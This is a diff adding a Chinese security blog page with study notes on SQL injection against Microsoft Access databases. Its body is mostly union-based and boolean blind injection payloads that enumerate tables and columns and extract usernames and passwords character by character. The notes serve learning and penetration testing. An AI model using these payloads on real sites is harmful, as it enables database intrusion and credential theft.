@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html  lang="zh-CN" >
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#fff" id="theme-color">
+  <meta name="description" content="混口饭吃">
+  <link rel="icon" href="/img/logo.png">
+  <title>混口饭吃</title>
+  
+  
+  <meta property="og:title" content="混口饭吃">
+  
+  
+  <meta property="og:url" content="http://example.com/2022/02/15/Access%E6%B3%A8%E5%85%A5/index.html">
+  
+  
+  <meta property="og:img" content="/img/author.jpg">
+  
+  
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:published_time" content="2022-02-15">
+  <meta property="og:article:modified_time" content="2022-02-15">
+  <meta property="og:article:author" content="YiHua">
+  
+  
+  <meta property="og:article:tag" content="SQL注入">
+  
+  
+  
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+    var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+      }
+    };
+    setDarkmode();
+  </script>
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+  </script>
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+  <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+
+  
+  
+<link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <div class="wrapper">
+    
+    <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+      <img class="navbar-logo-img" src="/img/logo.png" alt="logo">
+      
+      <span class="navbar-logo-dsc">混口饭吃</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+    <a href="/" class="navbar-menu-item">
+    
+    首页
+    
+    </a>
+    
+    <a href="/archives" class="navbar-menu-item">
+    
+    归档
+    
+    </a>
+    
+    <a href="/tags" class="navbar-menu-item">
+    
+    标签
+    
+    </a>
+    
+    <a href="/categories" class="navbar-menu-item">
+    
+    分类
+    
+    </a>
+    
+    <a href="/about" class="navbar-menu-item">
+    
+    关于
+    
+    </a>
+    
+    <a href="/links" class="navbar-menu-item">
+    
+    友链
+    
+    </a>
+    
+    <a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i></a>
+    <a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size: 1.2rem; font-weight: 400;"></i></a>
+  </div>
+</nav>
+    
+    <div id="local-search" style="display: none;">
+      <input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容...">
+      <div id="search-content"></div>
+    </div>
+    
+    <div class="section-wrap">
+      <div class="container">
+        <div class="columns">
+          <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2022-02-15T11:32:48.164Z">
+      <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
+      <span>2022-02-15</span>
+    </time>
+    
+    <span class="dot"></span>
+    
+    <a href="/categories/web安全/" class="post-meta-link">web安全</a>
+    
+    
+    
+    <span class="dot"></span>
+    <span>575 字</span>
+    
+  </div>
+  
+  <div class="post-meta post-show-meta" style="margin-top: -10px;">
+    <div style="display: flex; align-items: center;">
+      <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
+      
+      
+        <a href="/tags/SQL注入/" class="post-meta-link">SQL注入</a>
+      
+    </div>
+  </div>
+  
+  </header>
+  <div id="section" class="post-content">
+    <h3 id="一：联合注入"><a href="#一：联合注入" class="headerlink" title="一：联合注入"></a>一：联合注入</h3><p>因为access数据库储存方式与其他数据库不同，其他类型的数据库都有库名，access数据库类型每个文件就是一个库。所以需要猜测数据库的表名</p>
+<h5 id="1-猜测表名和列名"><a href="#1-猜测表名和列名" class="headerlink" title="1.猜测表名和列名"></a>1.猜测表名和列名</h5><h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><pre class="highlight"><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> exists(select count(*)<span class="keyword">from</span> tb_name)   <span class="comment">//通过修改tb_name，来爆破表名</span></span><br></pre>
+
+<pre class="highlight"><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> exists(select count(column_name)<span class="keyword">from</span> tb_name)   <span class="comment">//指定表名，通过修改column_name，来爆破字段名</span></span><br></pre>
+
+<h5 id="2-判断注入类型"><a href="#2-判断注入类型" class="headerlink" title="2.判断注入类型"></a>2.判断注入类型</h5><h6 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h6><pre class="highlight"><span class="line">id=<span class="number">1</span><span class="string">&#x27;&quot;\							//判断注入类型</span></span><br><span class="line"><span class="string">id=1 and 1=1 					//回显正常</span></span><br><span class="line"><span class="string">id=1 and 1=0					//回显不正常</span></span><br></pre>
+
+<h5 id="3-判断字段数"><a href="#3-判断字段数" class="headerlink" title="3.判断字段数"></a>3.判断字段数</h5><h6 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h6><pre class="highlight"><span class="line">?id=<span class="number">1</span> order by <span class="number">3</span> --				<span class="comment">//判断字段数</span></span><br></pre>
+
+<h5 id="4-查看回显位"><a href="#4-查看回显位" class="headerlink" title="4.查看回显位"></a>4.查看回显位</h5><h6 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h6><pre class="highlight"><span class="line">?id=<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> --				<span class="comment">//查看回显位</span></span><br></pre>
+
+<h5 id="5-使用top遍历字段数据"><a href="#5-使用top遍历字段数据" class="headerlink" title="5.使用top遍历字段数据"></a>5.使用top遍历字段数据</h5><h6 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h6><pre class="highlight"><span class="line">?id=<span class="number">1</span> union select top <span class="number">1</span> <span class="number">1</span>,username,password <span class="keyword">from</span> user where username not in(select top <span class="number">1</span> username <span class="keyword">from</span> user) --</span><br></pre>
+
+<h3 id="二：bool盲注"><a href="#二：bool盲注" class="headerlink" title="二：bool盲注"></a>二：bool盲注</h3><h5 id="1-猜测表名和列名-1"><a href="#1-猜测表名和列名-1" class="headerlink" title="1.猜测表名和列名"></a>1.猜测表名和列名</h5><h6 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h6><pre class="highlight"><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> exists(select count(*)<span class="keyword">from</span> tb_name)   <span class="comment">//通过修改tb_name，来爆破表名</span></span><br></pre>
+
+<pre class="highlight"><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> exists(select count(column_name)<span class="keyword">from</span> tb_name)   <span class="comment">//指定表名，通过修改column_name，来爆破字段名</span></span><br></pre>
+
+<h5 id="2-获取列名的长度"><a href="#2-获取列名的长度" class="headerlink" title="2.获取列名的长度"></a>2.获取列名的长度</h5><h6 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h6><pre class="highlight"><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> (select top <span class="number">1</span> len(username) <span class="keyword">from</span> user where username not in (select top <span class="number">1</span> username <span class="keyword">from</span> user))&gt;<span class="number">5</span>			<span class="comment">//获取第一个列名的长度</span></span><br></pre>
+
+<h5 id="3-获取列名数据"><a href="#3-获取列名数据" class="headerlink" title="3.获取列名数据"></a>3.获取列名数据</h5><pre class="highlight"><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> user where username not in (select top <span class="number">1</span> username <span class="keyword">from</span> user))&gt;<span class="number">70</span>	</span><br><span class="line"><span class="comment">//获取第一个行的第一个字母</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> user where username not in (select top <span class="number">1</span> username <span class="keyword">from</span> user))&gt;<span class="number">70</span>	</span><br><span class="line"><span class="comment">//获取第一个行的第二个字母 </span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">3</span>,<span class="number">1</span>)) <span class="keyword">from</span> user where username not in (select top <span class="number">1</span> username <span class="keyword">from</span> user))&gt;<span class="number">70</span>	</span><br><span class="line"><span class="comment">//获取第一个行的第三个字母   </span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//通过该变mid(username,3,1)来遍历表 第一行的所有字母   </span></span><br></pre>
+
+<pre class="highlight"><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> user where username not in (select top <span class="number">2</span> username <span class="keyword">from</span> user))&gt;<span class="number">70</span>	</span><br><span class="line"><span class="comment">//获取第二个行的第一个字母</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> user where username not in (select top <span class="number">2</span> username <span class="keyword">from</span> user))&gt;<span class="number">70</span>	</span><br><span class="line"><span class="comment">//获取第二个行的第二个字母 </span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">3</span>,<span class="number">1</span>)) <span class="keyword">from</span> user where username not in (select top <span class="number">2</span> username <span class="keyword">from</span> user))&gt;<span class="number">70</span>	</span><br><span class="line"><span class="comment">//获取第二个行的第三个字母   </span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//通过该变top 2 来获取第二行的数据   </span></span><br></pre>
+
+
+  </div>
+  <div>
+  
+  <div class="post-note note-warning copyright" style="margin-top: 42px">
+    <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/about">YiHua</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/2022/02/15/Access%E6%B3%A8%E5%85%A5/">http://example.com/2022/02/15/Access%E6%B3%A8%E5%85%A5/</a></p>
+    <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+  </div>
+  
+  </div>
+</article>
+<div class="nav">
+  
+  <div class="nav-item-prev">
+    <a href="/2022/02/16/oracle数据库注入/" class="nav-link">
+      <i class="iconfont icon-left nav-prev-icon"></i>
+      <div>
+        <div class="nav-label">上一篇</div>
+        
+      </div>
+    </a>
+  </div>
+  
+  
+  <div class="nav-item-next">
+    <a href="/2022/02/15/MSSQL/" class="nav-link">
+      <div>
+        <div class="nav-label">下一篇</div>
+        
+      </div>
+      <i class="iconfont icon-right nav-next-icon"></i>
+    </a>
+  </div>
+  
+</div>
+
+<div class="card card-content toc-card" id="mobiletoc">
+  <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">一：联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97%E5%90%8D"><span class="toc-text">1.猜测表名和列名</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">2.判断注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-1"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">3.判断字段数</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-2"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-text">4.查看回显位</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-3"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8top%E9%81%8D%E5%8E%86%E5%AD%97%E6%AE%B5%E6%95%B0%E6%8D%AE"><span class="toc-text">5.使用top遍历字段数据</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-4"><span class="toc-text">payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Abool%E7%9B%B2%E6%B3%A8"><span class="toc-text">二：bool盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97%E5%90%8D-1"><span class="toc-text">1.猜测表名和列名</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-5"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-text">2.获取列名的长度</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-6"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D%E6%95%B0%E6%8D%AE"><span class="toc-text">3.获取列名数据</span></a></li></ol></li></ol></li></ol>
+</div></main>
+          <aside class="left-column">
+            
+            <div class="card card-author">
+              
+<img src="/img/author.jpg" class="author-img">
+
+<p class="author-name">YiHua</p>
+<p class="author-description">谨言  深思  笃行</p>
+<div class="author-message">
+  <a class="author-posts-count" href="/archives">
+    <span>27</span>
+    <span>文章</span>
+  </a>
+  <a class="author-categories-count" href="/categories">
+    <span>10</span>
+    <span>分类</span>
+  </a>
+  <a class="author-tags-count" href="/tags">
+    <span>9</span>
+    <span>标签</span>
+  </a>
+</div>
+
+            </div>
+            
+            <div class="sticky-tablet">
+  
+  
+  <article class="display-when-two-columns spacer">
+    <div class="card card-content toc-card">
+      <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">一：联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97%E5%90%8D"><span class="toc-text">1.猜测表名和列名</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">2.判断注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-1"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">3.判断字段数</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-2"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-text">4.查看回显位</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-3"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8top%E9%81%8D%E5%8E%86%E5%AD%97%E6%AE%B5%E6%95%B0%E6%8D%AE"><span class="toc-text">5.使用top遍历字段数据</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-4"><span class="toc-text">payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Abool%E7%9B%B2%E6%B3%A8"><span class="toc-text">二：bool盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97%E5%90%8D-1"><span class="toc-text">1.猜测表名和列名</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-5"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-text">2.获取列名的长度</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-6"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D%E6%95%B0%E6%8D%AE"><span class="toc-text">3.获取列名数据</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right: 2px;"></i>分类</div>
+  <div class="categories-list">
+    
+      <a href="/categories/计算机网络/">
+        <div class="categories-list-item">
+          计算机网络
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/CentoS-7基础/">
+        <div class="categories-list-item">
+          CentoS-7基础
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/web安全/">
+        <div class="categories-list-item">
+          web安全
+          <span class="categories-list-item-badge">7</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Mysql数据库/">
+        <div class="categories-list-item">
+          Mysql数据库
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/php代码基础/">
+        <div class="categories-list-item">
+          php代码基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/windows-2008-R2/">
+        <div class="categories-list-item">
+          windows-2008-R2
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/文件上传漏洞/">
+        <div class="categories-list-item">
+          文件上传漏洞
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/文件包含漏洞/">
+        <div class="categories-list-item">
+          文件包含漏洞
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/渗透测试/">
+        <div class="categories-list-item">
+          渗透测试
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/代码审计/">
+        <div class="categories-list-item">
+          代码审计
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right: 2px;"></i>热门标签</div>
+  <div class="tags-list">
+    
+    <a href="/tags/SQL注入/" title="SQL注入"><div class="tags-list-item">SQL注入</div></a>
+    
+    <a href="/tags/Linux/" title="Linux"><div class="tags-list-item">Linux</div></a>
+    
+    <a href="/tags/计算机网络/" title="计算机网络"><div class="tags-list-item">计算机网络</div></a>
+    
+    <a href="/tags/php代码基础/" title="php代码基础"><div class="tags-list-item">php代码基础</div></a>
+    
+    <a href="/tags/web安全/" title="web安全"><div class="tags-list-item">web安全</div></a>
+    
+    <a href="/tags/代码审计/" title="代码审计"><div class="tags-list-item">代码审计</div></a>
+    
+    <a href="/tags/渗透测试/" title="渗透测试"><div class="tags-list-item">渗透测试</div></a>
+    
+    <a href="/tags/windows/" title="windows"><div class="tags-list-item">windows</div></a>
+    
+    <a href="/tags/webshell/" title="webshell"><div class="tags-list-item">webshell</div></a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+          <aside class="right-column">
+            <div class="sticky-widescreen">
+  
+  
+  <article class="card card-content toc-card">
+    <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">一：联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97%E5%90%8D"><span class="toc-text">1.猜测表名和列名</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">2.判断注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-1"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">3.判断字段数</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-2"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-text">4.查看回显位</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-3"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8top%E9%81%8D%E5%8E%86%E5%AD%97%E6%AE%B5%E6%95%B0%E6%8D%AE"><span class="toc-text">5.使用top遍历字段数据</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-4"><span class="toc-text">payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Abool%E7%9B%B2%E6%B3%A8"><span class="toc-text">二：bool盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97%E5%90%8D-1"><span class="toc-text">1.猜测表名和列名</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-5"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-text">2.获取列名的长度</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-6"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D%E6%95%B0%E6%8D%AE"><span class="toc-text">3.获取列名数据</span></a></li></ol></li></ol></li></ol>
+  </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right: 2px;"></i>最近文章</div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-23</div>
+        <a href="/2022/02/23/文件包含漏洞/"><div class="recent-posts-item-content">文件包含漏洞</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-23</div>
+        <a href="/2022/02/23/文件上传漏洞/"><div class="recent-posts-item-content">文件上传漏洞</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-17</div>
+        <a href="/2022/02/17/mysql数据外带/"><div class="recent-posts-item-content"></div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-17</div>
+        <a href="/2022/02/17/一：获取数据库网站密码/"><div class="recent-posts-item-content"></div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>Copyright ©
+          
+          2020 -
+          
+          2022
+        </span>
+        &nbsp;
+        <a href="/" class="footer-link">混口饭吃 </a>
+      </div>
+    </div>
+
+    
+    <div class="footer-dsc">
+      
+      Powered by
+      <a href="https://hexo.io/" class="footer-link" target="_blank" rel="nofollow noopener noreferrer">&nbsp;Hexo </a>
+      
+      
+      <span>&nbsp;|&nbsp;</span>
+      
+      
+      Theme -
+      <a href="https://github.com/theme-kaze" class="footer-link" target="_blank"
+        rel="nofollow noopener noreferrer">&nbsp;Kaze</a>
+      
+    </div>
+    
+    
+    
+    
+</footer>
+  <a role="button" id="scrollbutton" class="basebutton"  aria-label="回到顶部">
+  <i class="iconfont icon-arrowleft button-icon"></i>
+</a>
+<a role="button" id="menubutton" class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a role="button" id="popbutton" class="basebutton" aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a role="button" id="darkbutton" class="basebutton darkwidget" aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a role="button" id="searchbutton" class="basebutton searchwidget" aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a>
+
+  
+  
+  
+  <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img');
+    var i;
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a');
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'));
+      wrapper.setAttribute('aria-label', 'illustration');
+      wrapper.style.cssText = 'width: 100%; display: flex; justify-content: center;';
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt;
+      wrapper.dataset.nolink = true;
+      img[i].before(wrapper);
+      wrapper.append(img[i]);
+      var divWrap = document.createElement('div');
+      divWrap.classList.add('gallery');
+      wrapper.before(divWrap);
+      divWrap.append(wrapper);
+    }
+    baguetteBox.run('.gallery');
+  }
+</script>
+<script>loadScript("/js/lib/lightbox/baguetteBox.min.js", addImgLayout)</script>
+  
+  
+  
+<script src="/js/main.js"></script>
+
+  
+  
+  <script>
+    var addLazyload = function () {
+      var observer = lozad('.lozad', {
+        load: function (el) {
+          el.srcset = el.getAttribute('data-src');
+        },
+        loaded: function (el) {
+          el.classList.add('loaded');
+        }
+      });
+      observer.observe();
+    }
